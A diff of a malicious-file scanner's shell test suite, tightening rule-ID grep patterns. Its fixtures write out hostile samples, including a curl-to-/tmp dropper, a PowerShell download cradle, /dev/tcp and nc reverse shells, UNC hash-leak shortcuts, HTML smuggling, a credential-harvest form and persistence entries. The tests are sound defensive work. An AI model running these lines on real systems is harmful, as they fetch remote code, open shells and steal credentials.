@@ -376,13 +376,13 @@ assert data["hardening_band"] in ("hardened", "good", "fair", "weak")
 # ICS calendar-invite phishing (F7): VCALENDAR with credential-bait link → flagged
 ICS_DIR=$(mktemp -d)
 printf 'BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\nSUMMARY:Verify your account\r\nLOCATION:https://paypa1-secure.verify-account.top/login\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n' > "$ICS_DIR/invite.ics"
-./hlse_core file "$ICS_DIR/invite.ics" 2>&1 | grep -q "F7" \
+./hlse_core file "$ICS_DIR/invite.ics" 2>&1 | grep -q "F7:" \
     && check "ICS phish: calendar invite with phish URL flagged" "0" "0" \
     || check "ICS phish: calendar invite with phish URL flagged" "0" "1"
 
 # ICS dropper: invite linking an .exe → flagged even on a clean host
 printf 'BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nURL:https://cdn.example.com/setup.exe\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n' > "$ICS_DIR/dropper.ics"
-./hlse_core file "$ICS_DIR/dropper.ics" 2>&1 | grep -q "F7" \
+./hlse_core file "$ICS_DIR/dropper.ics" 2>&1 | grep -q "F7:" \
     && check "ICS phish: invite linking executable flagged" "0" "0" \
     || check "ICS phish: invite linking executable flagged" "0" "1"
 
@@ -432,19 +432,19 @@ rm -rf /tmp/hlse_sh2.$$
 # Launcher/shortcut carriers (F8): .desktop Exec= curl→/tmp dropper (APT36) → flagged
 LCH_DIR=$(mktemp -d)
 printf '[Desktop Entry]\nType=Application\nName=Doc Viewer\nExec=sh -c "curl -s https://cdn.bad.example/p.sh -o /tmp/p && chmod +x /tmp/p && /tmp/p"\n' > "$LCH_DIR/apt36.desktop"
-./hlse_core file "$LCH_DIR/apt36.desktop" 2>&1 | grep -q "F8" \
+./hlse_core file "$LCH_DIR/apt36.desktop" 2>&1 | grep -q "F8:" \
     && check "F8: .desktop curl→/tmp dropper flagged" "0" "0" \
     || check "F8: .desktop curl→/tmp dropper flagged" "0" "1"
 
 # F8: .url InternetShortcut with phish link → flagged
 printf '[InternetShortcut]\nURL=https://paypa1-secure.verify-account.top/login\n' > "$LCH_DIR/phish.url"
-./hlse_core file "$LCH_DIR/phish.url" 2>&1 | grep -q "F8" \
+./hlse_core file "$LCH_DIR/phish.url" 2>&1 | grep -q "F8:" \
     && check "F8: .url with phish URL flagged" "0" "0" \
     || check "F8: .url with phish URL flagged" "0" "1"
 
 # F8 FP guard: legit .desktop launcher (no download/exec payload) → no F8
 printf '[Desktop Entry]\nType=Application\nName=Firefox\nExec=firefox %%u\n' > "$LCH_DIR/ff.desktop"
-./hlse_core file "$LCH_DIR/ff.desktop" 2>&1 | grep -q "F8" \
+./hlse_core file "$LCH_DIR/ff.desktop" 2>&1 | grep -q "F8:" \
     && check "F8 FP guard: legit .desktop has no F8" "0" "1" \
     || check "F8 FP guard: legit .desktop has no F8" "0" "0"
 
@@ -460,7 +460,7 @@ LNK_DIR=$(mktemp -d)
   printf '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   printf 'p\x00o\x00w\x00e\x00r\x00s\x00h\x00e\x00l\x00l\x00 \x00-\x00e\x00n\x00c\x00 \x00a\x00G\x00V\x00s\x00b\x00G\x008\x00=\x00 \x00h\x00t\x00t\x00p\x00s\x00:\x00/\x00/\x00e\x00v\x00i\x00l\x00.\x00e\x00x\x00a\x00m\x00p\x00l\x00e\x00/\x00x\x00'
 } > "$LNK_DIR/evil.lnk"
-./hlse_core file "$LNK_DIR/evil.lnk" 2>&1 | grep -q "F9" \
+./hlse_core file "$LNK_DIR/evil.lnk" 2>&1 | grep -q "F9:" \
     && check "F9: .lnk with powershell -enc flagged" "0" "0" \
     || check "F9: .lnk with powershell -enc flagged" "0" "1"
 
@@ -469,7 +469,7 @@ LNK_DIR=$(mktemp -d)
   printf '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   printf 'e\x00x\x00p\x00l\x00o\x00r\x00e\x00r\x00.\x00e\x00x\x00e\x00'
 } > "$LNK_DIR/clean.lnk"
-./hlse_core file "$LNK_DIR/clean.lnk" 2>&1 | grep -q "F9" \
+./hlse_core file "$LNK_DIR/clean.lnk" 2>&1 | grep -q "F9:" \
     && check "F9 FP guard: clean .lnk has no F9" "0" "1" \
     || check "F9 FP guard: clean .lnk has no F9" "0" "0"
 rm -rf "$LNK_DIR"
@@ -482,19 +482,19 @@ rm -rf "$LNK_DIR"
 # F10: .scf IconFile=\\UNC → NetNTLM leak flagged
 UNC_DIR=$(mktemp -d)
 printf '[Shell]\nCommand=2\nIconFile=\\\\198.51.100.7\\share\\icon.ico\n' > "$UNC_DIR/leak.scf"
-./hlse_core file "$UNC_DIR/leak.scf" 2>&1 | grep -q "F10" \
+./hlse_core file "$UNC_DIR/leak.scf" 2>&1 | grep -q "F10:" \
     && check "F10: .scf IconFile UNC flagged" "0" "0" \
     || check "F10: .scf IconFile UNC flagged" "0" "1"
 
 # F10 FP guard: desktop.ini with LOCAL IconResource → no F10
 printf '[.ShellClassInfo]\nIconResource=C:\\Windows\\System32\\shell32.dll,21\n' > "$UNC_DIR/desktop.ini"
-./hlse_core file "$UNC_DIR/desktop.ini" 2>&1 | grep -q "F10" \
+./hlse_core file "$UNC_DIR/desktop.ini" 2>&1 | grep -q "F10:" \
     && check "F10 FP guard: local IconResource has no F10" "0" "1" \
     || check "F10 FP guard: local IconResource has no F10" "0" "0"
 
 # F8/F10: .url carrying IconFile=\\UNC
 printf '[InternetShortcut]\nURL=https://x.evil.example\nIconFile=\\\\evil.example\\share\\i.ico\n' > "$UNC_DIR/pay.url"
-./hlse_core file "$UNC_DIR/pay.url" 2>&1 | grep -q "F10" \
+./hlse_core file "$UNC_DIR/pay.url" 2>&1 | grep -q "F10:" \
     && check "F10: .url IconFile UNC flagged" "0" "0" \
     || check "F10: .url IconFile UNC flagged" "0" "1"
 rm -rf "$UNC_DIR"
@@ -532,25 +532,25 @@ rm -rf "$UNC_DIR"
 # F11: HTML smuggling — atob + Blob + download= in a <script> → flagged
 SM_DIR=$(mktemp -d)
 printf '<!DOCTYPE html><html><body><script>var d=atob("TVo=");var b=new Blob([d]);var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download="invoice.iso";a.click();</script></body></html>' > "$SM_DIR/smuggle.html"
-./hlse_core file "$SM_DIR/smuggle.html" 2>&1 | grep -q "F11" \
+./hlse_core file "$SM_DIR/smuggle.html" 2>&1 | grep -q "F11:" \
     && check "F11: HTML smuggling flagged" "0" "0" \
     || check "F11: HTML smuggling flagged" "0" "1"
 
 # F11 FP guard: plain HTML page → no F11
 printf '<!DOCTYPE html><html><body><p>hello</p></body></html>' > "$SM_DIR/benign.html"
-./hlse_core file "$SM_DIR/benign.html" 2>&1 | grep -q "F11" \
+./hlse_core file "$SM_DIR/benign.html" 2>&1 | grep -q "F11:" \
     && check "F11 FP guard: benign html has no F11" "0" "1" \
     || check "F11 FP guard: benign html has no F11" "0" "0"
 
 # F12: ZIP-slip — member name '../evil.sh' → flagged
 printf 'PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x00\x00../evil.sh' > "$SM_DIR/slip.zip"
-./hlse_core file "$SM_DIR/slip.zip" 2>&1 | grep -q "F12" \
+./hlse_core file "$SM_DIR/slip.zip" 2>&1 | grep -q "F12:" \
     && check "F12: zip-slip ../ member flagged" "0" "0" \
     || check "F12: zip-slip ../ member flagged" "0" "1"
 
 # F12 FP guard: normal member names → no F12
 printf 'PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00ok.txt' > "$SM_DIR/ok.zip"
-./hlse_core file "$SM_DIR/ok.zip" 2>&1 | grep -q "F12" \
+./hlse_core file "$SM_DIR/ok.zip" 2>&1 | grep -q "F12:" \
     && check "F12 FP guard: normal zip has no F12" "0" "1" \
     || check "F12 FP guard: normal zip has no F12" "0" "0"
 rm -rf "$SM_DIR"
@@ -635,11 +635,11 @@ rm -rf "$VCS_DIR"
 # F13: credential-harvest HTML form → flagged; relative action → clean
 CF_DIR=$(mktemp -d)
 printf '<html><body><form action="https://evil.example/harvest" method="post"><input name="user"><input name="password" type="password"></form></body></html>' > "$CF_DIR/login.html"
-./hlse_core file "$CF_DIR/login.html" 2>&1 | grep -q "F13" \
+./hlse_core file "$CF_DIR/login.html" 2>&1 | grep -q "F13:" \
     && check "F13: remote-action password form flagged" "0" "0" \
     || check "F13: remote-action password form flagged" "0" "1"
 printf '<html><body><form action="/login" method="post"><input name="password" type="password"></form></body></html>' > "$CF_DIR/local.html"
-./hlse_core file "$CF_DIR/local.html" 2>&1 | grep -q "F13" \
+./hlse_core file "$CF_DIR/local.html" 2>&1 | grep -q "F13:" \
     && check "F13 FP guard: relative-action form clean" "0" "1" \
     || check "F13 FP guard: relative-action form clean" "0" "0"
 rm -rf "$CF_DIR"
@@ -746,23 +746,23 @@ rm -rf "$GR_DIR"
 # F14 script cradle + F15 reg persistence + pyproject.toml PEP621
 SC_DIR=$(mktemp -d)
 printf 'IEX(New-Object Net.WebClient).DownloadString("http://evil.example/a.ps1")' > "$SC_DIR/dl.ps1"
-./hlse_core file "$SC_DIR/dl.ps1" 2>&1 | grep -q "F14" \
+./hlse_core file "$SC_DIR/dl.ps1" 2>&1 | grep -q "F14:" \
     && check "f14: IEX DownloadString cradle flagged" "0" "0" \
     || check "f14: IEX DownloadString cradle flagged" "0" "1"
 printf 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' > "$SC_DIR/enc.ps1"
-./hlse_core file "$SC_DIR/enc.ps1" 2>&1 | grep -q "F14" \
+./hlse_core file "$SC_DIR/enc.ps1" 2>&1 | grep -q "F14:" \
     && check "f14: -enc encoded-command flagged" "0" "0" \
     || check "f14: -enc encoded-command flagged" "0" "1"
 printf 'Out-File -enc utf8 out.txt\nGet-Content in.txt\n' > "$SC_DIR/benign.ps1"
-./hlse_core file "$SC_DIR/benign.ps1" 2>&1 | grep -q "F14" \
+./hlse_core file "$SC_DIR/benign.ps1" 2>&1 | grep -q "F14:" \
     && check "f14 FP guard: -enc utf8 (Encoding abbrev) clean" "0" "1" \
     || check "f14 FP guard: -enc utf8 (Encoding abbrev) clean" "0" "0"
 printf 'Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"Evil"="cmd.exe /c x.bat"\n' > "$SC_DIR/persist.reg"
-./hlse_core file "$SC_DIR/persist.reg" 2>&1 | grep -q "F15" \
+./hlse_core file "$SC_DIR/persist.reg" 2>&1 | grep -q "F15:" \
     && check "f15: Run-key .reg flagged" "0" "0" \
     || check "f15: Run-key .reg flagged" "0" "1"
 printf 'Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\MyApp]\n"Theme"="Dark"\n' > "$SC_DIR/settings.reg"
-./hlse_core file "$SC_DIR/settings.reg" 2>&1 | grep -q "F15" \
+./hlse_core file "$SC_DIR/settings.reg" 2>&1 | grep -q "F15:" \
     && check "f15 FP guard: ordinary .reg clean" "0" "1" \
     || check "f15 FP guard: ordinary .reg clean" "0" "0"
 printf '[project]\ndependencies = ["requets==1.0", "requests"]\n' > "$SC_DIR/pyproject.toml"
@@ -774,19 +774,19 @@ printf '[project]\ndependencies = ["requests>=2", "flask"]\n' > "$SC_DIR/pyproje
     && check "pyproject FP guard: real names clean" "0" "1" \
     || check "pyproject FP guard: real names clean" "0" "0"
 printf '%%PDF-1.4\n1 0 obj<</OpenAction<</S/JavaScript/JS(app.alert("x"))>>>>\n' > "$SC_DIR/act.pdf"
-./hlse_core file "$SC_DIR/act.pdf" 2>&1 | grep -q "F16" \
+./hlse_core file "$SC_DIR/act.pdf" 2>&1 | grep -q "F16:" \
     && check "f16: PDF /OpenAction flagged" "0" "0" \
     || check "f16: PDF /OpenAction flagged" "0" "1"
 printf '%%PDF-1.4\n1 0 obj<</Pages 2 0 R>>\n' > "$SC_DIR/clean.pdf"
-./hlse_core file "$SC_DIR/clean.pdf" 2>&1 | grep -q "F16" \
+./hlse_core file "$SC_DIR/clean.pdf" 2>&1 | grep -q "F16:" \
     && check "f16 FP guard: plain PDF clean" "0" "1" \
     || check "f16 FP guard: plain PDF clean" "0" "0"
 printf '{\\rtf1 {\\object\\objdata 01050000}}' > "$SC_DIR/embed.rtf"
-./hlse_core file "$SC_DIR/embed.rtf" 2>&1 | grep -q "F17" \
+./hlse_core file "$SC_DIR/embed.rtf" 2>&1 | grep -q "F17:" \
     && check "f17: RTF \\objdata flagged" "0" "0" \
     || check "f17: RTF \\objdata flagged" "0" "1"
 printf '{\\rtf1 plain text document}' > "$SC_DIR/note.rtf"
-./hlse_core file "$SC_DIR/note.rtf" 2>&1 | grep -q "F17" \
+./hlse_core file "$SC_DIR/note.rtf" 2>&1 | grep -q "F17:" \
     && check "f17 FP guard: plain RTF clean" "0" "1" \
     || check "f17 FP guard: plain RTF clean" "0" "0"
 rm -rf "$SC_DIR"
@@ -813,15 +813,15 @@ rm -rf "$SC_DIR"
 # F18 rc/persistence-file checks (LD_PRELOAD, hooksPath, forced-command)
 RC_DIR=$(mktemp -d)
 printf 'export LD_PRELOAD=/tmp/ev.so\n' > "$RC_DIR/.bashrc"
-./hlse_core file "$RC_DIR/.bashrc" 2>&1 | grep -q "F18" \
+./hlse_core file "$RC_DIR/.bashrc" 2>&1 | grep -q "F18:" \
     && check "f18: .bashrc LD_PRELOAD flagged" "0" "0" \
     || check "f18: .bashrc LD_PRELOAD flagged" "0" "1"
 printf '[core]\n\thooksPath = /tmp/evil-hooks\n' > "$RC_DIR/.gitconfig"
-./hlse_core file "$RC_DIR/.gitconfig" 2>&1 | grep -q "F18" \
+./hlse_core file "$RC_DIR/.gitconfig" 2>&1 | grep -q "F18:" \
     && check "f18: gitconfig hooksPath flagged" "0" "0" \
     || check "f18: gitconfig hooksPath flagged" "0" "1"
 printf 'ssh-ed25519 AAAA… command="/tmp/x" u@h\n' > "$RC_DIR/authorized_keys"
-./hlse_core file "$RC_DIR/authorized_keys" 2>&1 | grep -q "F18" \
+./hlse_core file "$RC_DIR/authorized_keys" 2>&1 | grep -q "F18:" \
     && check "f18: authorized_keys command= flagged" "0" "0" \
     || check "f18: authorized_keys command= flagged" "0" "1"
 printf 'export PATH=$HOME/bin:$PATH\nalias ll="ls -la"\n' > "$RC_DIR/.bashrc"
@@ -843,7 +843,7 @@ rm -rf "$RC_DIR"
     || check "url FP guard: encoded prose clean" "0" "1"
 MR_DIR=$(mktemp -d)
 printf '<html><head><meta http-equiv="refresh" content="0;url=http://evil.example/p"></head></html>' > "$MR_DIR/m.html"
-./hlse_core file "$MR_DIR/m.html" 2>&1 | grep -q "F21" \
+./hlse_core file "$MR_DIR/m.html" 2>&1 | grep -q "F21:" \
     && check "f21: meta refresh redirect flagged" "0" "0" \
     || check "f21: meta refresh redirect flagged" "0" "1"
 printf '<meta charset="utf-8"><meta name="viewport" content="w">' > "$MR_DIR/ok.html"
@@ -864,15 +864,15 @@ rm -rf "$MR_DIR"
 # F19 reverse shell + F20 base-hijack + F18 ssh-config ext
 RS_DIR=$(mktemp -d)
 printf 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "$RS_DIR/r.sh"
-./hlse_core file "$RS_DIR/r.sh" 2>&1 | grep -q "F19" \
+./hlse_core file "$RS_DIR/r.sh" 2>&1 | grep -q "F19:" \
     && check "f19: /dev/tcp reverse shell flagged" "0" "0" \
     || check "f19: /dev/tcp reverse shell flagged" "0" "1"
 printf 'nc -e /bin/sh 10.0.0.1 4444\n' > "$RS_DIR/n.txt"
-./hlse_core file "$RS_DIR/n.txt" 2>&1 | grep -q "F19" \
+./hlse_core file "$RS_DIR/n.txt" 2>&1 | grep -q "F19:" \
     && check "f19: nc -e flagged" "0" "0" \
     || check "f19: nc -e flagged" "0" "1"
 printf '<html><head><base href="http://evil.example/"></head></html>' > "$RS_DIR/b.html"
-./hlse_core file "$RS_DIR/b.html" 2>&1 | grep -q "F20" \
+./hlse_core file "$RS_DIR/b.html" 2>&1 | grep -q "F20:" \
     && check "f20: base href hijack flagged" "0" "0" \
     || check "f20: base href hijack flagged" "0" "1"
 printf '<html><body>no base</body></html>' > "$RS_DIR/ok.html"
@@ -881,7 +881,7 @@ printf '<html><body>no base</body></html>' > "$RS_DIR/ok.html"
     || check "f20 FP guard: plain html clean" "0" "1"
 mkdir -p "$RS_DIR/.ssh"
 printf 'Host *\n  ProxyCommand nc X 22\n' > "$RS_DIR/.ssh/config"
-./hlse_core file "$RS_DIR/.ssh/config" 2>&1 | grep -q "F18" \
+./hlse_core file "$RS_DIR/.ssh/config" 2>&1 | grep -q "F18:" \
     && check "f18: ssh ProxyCommand flagged" "0" "0" \
     || check "f18: ssh ProxyCommand flagged" "0" "1"
 rm -rf "$RS_DIR"
@@ -7646,7 +7646,7 @@ printf '[Theme]\n[Control Panel\\Desktop]\nWallpaper=\\\\evil.example\\share\\im
     || check "file: .theme UNC wallpaper flagged" "0" "1"
 printf '[Theme]\n[Control Panel\\Desktop]\nWallpaper=C:\\Windows\\img.jpg\n' \
     > "$TDIR/ok.theme"
-./hlse_core file "$TDIR/ok.theme" 2>&1 | grep -q "F10" \
+./hlse_core file "$TDIR/ok.theme" 2>&1 | grep -q "F10:" \
     && check "file: local .theme not shell-meta" "0" "1" \
     || check "file: local .theme not shell-meta" "0" "0"
 rm -rf "$TDIR"
